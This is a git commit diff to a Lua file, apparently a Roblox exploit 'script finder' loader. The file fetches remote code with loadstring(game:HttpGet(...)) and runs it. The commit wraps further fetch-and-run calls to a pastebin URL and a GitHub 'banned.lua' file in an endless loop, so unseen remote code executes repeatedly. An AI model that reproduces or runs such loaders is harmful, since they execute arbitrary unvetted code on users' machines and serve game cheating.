b46ff1450c84cc17e9faceb0f93bc13d9bba46dc
GIGIBoxLoader <96883948+GIGIBoxLoader@users.noreply.github.com>
2022-01-26 19:10:03 +0100

    Update finder.lua

--- finder.lua
+++ finder.lua
@@ -1,1 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/GIGIBoxLoader/ABRLHUB-SCRIPTFINDER/main/adUI.lua", true))()
+while wait() do
+  loadstring(game:HttpGet("https://pastebin.com/raw/v86VDXtQ",true))()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/GIGIBoxLoader/ABRLHUB-SCRIPTFINDER/main/banned.lua"))()
+end
